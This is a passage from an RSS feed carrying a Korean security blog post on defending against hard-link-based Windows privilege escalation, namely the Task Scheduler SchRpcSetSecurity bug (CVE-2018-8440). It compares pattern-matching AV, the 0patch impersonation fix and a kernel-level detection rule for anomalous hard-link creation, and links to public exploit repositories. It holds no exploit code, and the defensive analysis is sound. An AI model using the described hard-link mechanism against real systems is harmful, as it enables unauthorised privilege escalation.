  &lt;li&gt;문자열을 암호화하는 방법으로 탐지 우회가 가능합니다.&lt;/li&gt;
  &lt;li&gt;오탐(False Positive)의 가능성이 있습니다. 익스플로잇이 아닌 정상실행파일 중에서 저 문자열을 포함하고 있을 가능성도 있는 것이죠. 물론 AV가 사용하는 매칭룰이 저렇게 간단하리라 생각하진 않습니다.&lt;/li&gt;
  &lt;li&gt;패턴매칭 방식은 알려지지 않은 제로데이 취약점에 대해서 탐지하기 어렵다는 단점도 가지고 있습니다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;(d) 태스크 스케쥴러 권한을 낮추는 방법&lt;sup id=&quot;fnref:8&quot;&gt;&lt;a href=&quot;#fn:8&quot; class=&quot;footnote&quot;&gt;7&lt;/a&gt;&lt;/sup&gt;(Impersonation)&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SchRpcSetSecurity&lt;/code&gt;의 내부 동작 중에서 취약점과 가장 관련이 있었던 부분은 바로 DACL을 변경하는 부분입니다. 여기서 제안한 방법은 태스크 스케쥴러가 DACL을 변경하기 전에 현재 스레드 토큰 대신 사용자(클라이언트)의 토큰(&lt;em&gt;Impersonation token&lt;/em&gt;)을 사용하여 자원에 접근하도록 하는 것입니다. 이러한 작업을 &lt;em&gt;Impersonation&lt;/em&gt;이라고 하는데요. DACL을 변경하는 작업 전에 태스크 스케쥴러 스레드의 권한을 사용자(클라이언트) 권한으로 잠시 변경하는 것이라 생각하면 됩니다. 이렇게 되면 &lt;em&gt;하드링크대상(예: PrintConfig.dll)의 DACL을 변경할 수 있는 권한이 사용자(클라이언트)에게 없으므로 취약점은 동작하지 않게 됩니다&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;이 방법이 취약점의 원인(Root Cause)을 정확히 이해하고 내린 적절한 해결책이라 생각합니다. 이 방법을 제안한 0patch라는 제품은 태스크 스케쥴러의 &lt;code class=&quot;highlighter-rouge&quot;&gt;SchRpcSetSecurity&lt;/code&gt; 함수 코드 부분을 바이너리 패치하는 방식으로 &lt;em&gt;Impersonation&lt;/em&gt;을 구현했습니다. 아마 마이크로소프트가 릴리즈한 패치도 &lt;em&gt;Impersonation&lt;/em&gt;을 이용하지 않았을까 추측해봅니다.&lt;/p&gt;

&lt;p&gt;하지만 제안된 방식은 해당 취약점만 패치한 것이라서, 새로 나올 권한상승 취약점 대응과는 무관하다는 단점이 있습니다.&lt;/p&gt;

&lt;h3 id=&quot;x-diffense&quot;&gt;X-DIFFENSE&lt;/h3&gt;

&lt;p&gt;하드링크를 활용하는 권한 상승 익스플로잇에 대한 효과적인 탐지 방안에 대해 소개합니다.&lt;/p&gt;

&lt;p&gt;하드링크가 필수적으로 동반되는 권한 상승 익스플로잇의 공통된 특징은 하드링크 대상 파일에 쓰기 권한이 없다는 점입니다. 익스플로잇이 이미 하드링크 대상 파일에 대해 쓰기 권한이 있다면 하드링크를 걸 필요가 없는 것이죠. 하드링크를 걸어둔다는 것은 취약점을 이용해서 하드링크대상의 쓰기 제한을 풀겠다는 의도니까요.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;하드링크가 생성되는 과정에서 그것을 만드는 주체가 하드링크 대상 파일에 쓰기 권한이 없는 경우는 굉장히 의심스러운 행위로 보아야 합니다.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;이러한 패턴은 표준 API인 &lt;code class=&quot;highlighter-rouge&quot;&gt;CreateHardLink&lt;/code&gt;에선 보이지 않습니다. MS가 의도하지 않은 방법으로 하드링크를 생성하려는 것이죠.&lt;/p&gt;

&lt;p&gt;따라서 이러한 행위를 감시할 수 있으면, 하드링크를 활용하는 권한상승 익스플로잇(기존 익스플로잇 및 앞으로 나올 제로데이를 포함하여)을 효과적으로 탐지하고 차단할 수 있습니다.&lt;/p&gt;

&lt;p&gt;X-DIFFENSE(출시예정)는 커널레벨(파일시스템필터)에서 언급한 방법을 적용해 비정상적인 하드링크 생성 행위를 감시하여 권한상승 시도 행위를 효과적으로 차단할 수 있습니다.&lt;/p&gt;

&lt;h3 id=&quot;reference&quot;&gt;Reference&lt;/h3&gt;

&lt;div class=&quot;footnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:1&quot;&gt;
      &lt;p&gt;MSDN, https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-createhardlinka &lt;a href=&quot;#fnref:1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:2&quot;&gt;
      &lt;p&gt;James Forshaw, Project Zero Blog, https://googleprojectzero.blogspot.com/2015/12/between-rock-and-hard-link.html &lt;a href=&quot;#fnref:2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:3&quot;&gt;
      &lt;p&gt;James Forshaw, https://github.com/googleprojectzero/symboliclink-testing-tools &lt;a href=&quot;#fnref:3&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:4&quot;&gt;
      &lt;p&gt;PowerPool malware exploits ALPC LPE zero-day vulnerability, https://www.welivesecurity.com/2018/09/05/powerpool-malware-exploits-zero-day-vulnerability/ &lt;a href=&quot;#fnref:4&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:5&quot;&gt;
      &lt;p&gt;Task Scheduler LPE from SandboxEscaper, https://github.com/jackson5-sec/TaskSchedLPE &lt;a href=&quot;#fnref:5&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:6&quot;&gt;
      &lt;p&gt;Task Scheduler ALPC exploit high level analysis – CVE-2018–8440, https://doublepulsar.com/task-scheduler-alpc-exploit-high-level-analysis-ff08cda6ad4f &lt;a href=&quot;#fnref:6&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt; &lt;a href=&quot;#fnref:6:1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;sup&gt;2&lt;/sup&gt;&lt;/a&gt; &lt;a href=&quot;#fnref:6:2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;sup&gt;3&lt;/sup&gt;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:8&quot;&gt;
      &lt;p&gt;How We Micropatched a Publicly Dropped 0day in Task Scheduler (CVE-2018-8440), https://blog.0patch.com/2018/08/how-we-micropatched-publicly-dropped.html &lt;a href=&quot;#fnref:8&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;
</description>
				
				<pubDate>Fri, 22 Feb 2019 00:00:00 +0900</pubDate>
				<link>http://localhost:4000/2019/02/22/hard-link/</link>
				<guid isPermaLink="true">http://localhost:4000/2019/02/22/hard-link/</guid>
			</item>
		
	</channel>
</rss>
